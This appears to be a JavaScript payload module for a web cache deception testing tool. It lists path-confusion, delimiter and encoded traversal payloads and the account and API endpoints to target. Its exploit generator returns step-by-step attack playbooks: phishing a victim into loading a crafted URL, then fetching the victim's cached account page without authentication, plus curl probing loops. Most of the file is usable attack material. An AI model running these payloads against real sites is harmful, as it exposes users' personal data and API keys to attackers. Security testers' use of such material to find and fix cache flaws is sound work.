// Web Cache Deception Vulnerability Payloads
// Comprehensive payload database for cache deception security testing

const CacheDeceptionPayloads = {
    // Path confusion with static extensions
    staticExtensions: [
        { ext: '.css', description: 'CSS stylesheet extension' },
        { ext: '.js', description: 'JavaScript extension' },
        { ext: '.jpg', description: 'JPEG image extension' },
        { ext: '.png', description: 'PNG image extension' },
        { ext: '.gif', description: 'GIF image extension' },
        { ext: '.ico', description: 'Icon extension' },
        { ext: '.svg', description: 'SVG image extension' },
        { ext: '.woff', description: 'Web font extension' },
        { ext: '.woff2', description: 'Web font 2 extension' }
    ],

    // Delimiter confusion
    delimiterConfusion: [
        { delimiter: ';', description: 'Semicolon delimiter' },
        { delimiter: '%3b', description: 'URL-encoded semicolon' },
        { delimiter: '%23', description: 'URL-encoded hash #' },
        { delimiter: '%3f', description: 'URL-encoded question mark' },
        { delimiter: '%00', description: 'Null byte' },
        { delimiter: '?', description: 'Query string delimiter' },
        { delimiter: '#', description: 'Fragment delimiter' }
    ],

    // Path normalization
    pathNormalization: [
        { payload: '/account/..%2fstatic/a.css', description: 'Encoded path traversal' },
        { payload: '/account/.%2e/static/a.css', description: 'Partial encoding' },
        { payload: '/static/../account', description: 'Path traversal to dynamic' },
        { payload: '/account%2f..%2fstatic', description: 'Full URL encoding' }
    ],

    // Common cacheable paths
    cacheablePaths: [
        '/static/',
        '/assets/',
        '/images/',
        '/css/',
        '/js/',
        '/media/',
        '/public/',
        '/resources/'
    ],

    // Sensitive endpoints to target
    sensitiveEndpoints: [
        { path: '/account', description: 'Account page with personal info' },
        { path: '/profile', description: 'User profile page' },
        { path: '/settings', description: 'User settings page' },
        { path: '/my-account', description: 'My account page' },
        { path: '/dashboard', description: 'User dashboard' },
        { path: '/api/user', description: 'User API endpoint' },
        { path: '/api/me', description: 'Current user API' }
    ],

    // Cache detection headers
    cacheHeaders: [
        'X-Cache',
        'X-Cache-Hit',
        'CF-Cache-Status',
        'Age',
        'X-Served-By',
        'X-Cache-Lookup',
        'X-Varnish'
    ],

    // URL patterns for deception
    urlPatterns: [
        { pattern: '{endpoint}/nonexistent.css', description: 'Append static file' },
        { pattern: '{endpoint};nonexistent.css', description: 'Semicolon + static file' },
        { pattern: '{endpoint}%2fnonexistent.css', description: 'Encoded slash + static' },
        { pattern: '{endpoint}?cachebuster.css', description: 'Query as static file' },
        { pattern: '{endpoint}/..%2f{endpoint}.css', description: 'Path confusion' }
    ]
};

// Test types
const CacheDeceptionTests = {
    extension: {
        name: 'Static Extension',
        description: 'Append static file extensions',
        severity: 'HIGH'
    },
    delimiter: {
        name: 'Delimiter Confusion',
        description: 'Use delimiters to confuse parser',
        severity: 'HIGH'
    },
    normalization: {
        name: 'Path Normalization',
        description: 'Exploit path normalization differences',
        severity: 'HIGH'
    },
    detection: {
        name: 'Cache Detection',
        description: 'Detect if response is cached',
        severity: 'MEDIUM'
    },
    exploit: {
        name: 'Full Exploit',
        description: 'Complete cache deception attack',
        severity: 'CRITICAL'
    }
};

// Helper functions
function getStaticExtensions() {
    return CacheDeceptionPayloads.staticExtensions;
}

function getDelimiterPayloads() {
    return CacheDeceptionPayloads.delimiterConfusion;
}

function getNormalizationPayloads() {
    return CacheDeceptionPayloads.pathNormalization;
}

function getSensitiveEndpoints() {
    return CacheDeceptionPayloads.sensitiveEndpoints;
}

function getURLPatterns() {
    return CacheDeceptionPayloads.urlPatterns;
}

function getPayloadCount() {
    return CacheDeceptionPayloads.staticExtensions.length +
        CacheDeceptionPayloads.delimiterConfusion.length +
        CacheDeceptionPayloads.pathNormalization.length +
        CacheDeceptionPayloads.sensitiveEndpoints.length +
        CacheDeceptionPayloads.urlPatterns.length;
}

function generateExploit(type) {
    switch (type) {
        case 'basic':
            return `# Basic Web Cache Deception Attack

# Step 1: Identify sensitive page (requires auth)
GET /my-account HTTP/1.1
Cookie: session=VICTIM_SESSION

# Response contains: API key, email, personal data

# Step 2: Create deceptive URL
https://target.com/my-account/nonexistent.css

# Step 3: Send to victim (phishing, XSS, etc)
<a href="https://target.com/my-account/nonexistent.css">Click here</a>

# Step 4: Victim clicks, cache stores their page

# Step 5: Attacker requests same URL (no auth)
GET /my-account/nonexistent.css HTTP/1.1
# No Cookie header - gets cached victim data!

# Check cache headers:
X-Cache: HIT
Age: 42
CF-Cache-Status: HIT`;

        case 'delimiter':
            return `# Delimiter-Based Cache Deception

# Some servers use delimiters differently

# Semicolon delimiter (Ruby/Rails)
GET /my-account;nonexistent.css HTTP/1.1

# Server sees: /my-account
# Cache sees: /my-account;nonexistent.css (static file)

# Encoded delimiters
GET /my-account%3bstatic.css HTTP/1.1   # %3b = ;
GET /my-account%23cache.css HTTP/1.1    # %23 = #
GET /my-account%3fcache.css HTTP/1.1    # %3f = ?

# Null byte (older systems)
GET /my-account%00.css HTTP/1.1

# Discovery: Test each delimiter
for delim in ";" "%3b" "%23" "%00"; do
  curl "https://target.com/my-account\${delim}test.css" -I
done`;

        case 'normalization':
            return `# Path Normalization Cache Deception

# Backend and cache normalize paths differently

# Exploit: Path traversal to static path
GET /static/../my-account HTTP/1.1

# Backend: Normalizes to /my-account (dynamic, auth required)
# Cache: Sees /static/.. (static directory = cacheable!)

# More normalization tricks:
GET /my-account/..%2fstatic/a.css HTTP/1.1
GET /my-account/.%2e/static/a.css HTTP/1.1
GET /my-account%2f..%2fstatic/x.css HTTP/1.1

# Double encoding
GET /my-account%252f..%252fstatic HTTP/1.1

# Case normalization (Windows/IIS)
GET /MY-ACCOUNT/test.CSS HTTP/1.1`;

        case 'detect':
            return `# Cache Detection Techniques

# 1. Check response headers
curl -I https://target.com/static/test.css

# Look for:
X-Cache: HIT/MISS
Age: <seconds>
CF-Cache-Status: HIT/MISS/DYNAMIC
X-Varnish: <id> <id>  # Two IDs = cache hit

# 2. Timing analysis
# First request (cache miss): ~200ms
# Second request (cache hit): ~20ms

# 3. Send request, wait, request again
curl https://target.com/my-account/test.css
sleep 5
curl https://target.com/my-account/test.css
# If same response with Age header = cached

# 4. Vary header bypass
# If Vary: Cookie, try without cookie
curl https://target.com/my-account/x.css  # no cookie`;

        default:
            return '';
    }
}

// Generate attack URL
function generateAttackURL(baseUrl, endpoint, pattern) {
    return pattern.replace('{endpoint}', `${baseUrl}${endpoint}`);
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        CacheDeceptionPayloads,
        CacheDeceptionTests,
        getStaticExtensions,
        getDelimiterPayloads,
        getNormalizationPayloads,
        getSensitiveEndpoints,
        getURLPatterns,
        getPayloadCount,
        generateExploit,
        generateAttackURL
    };
}
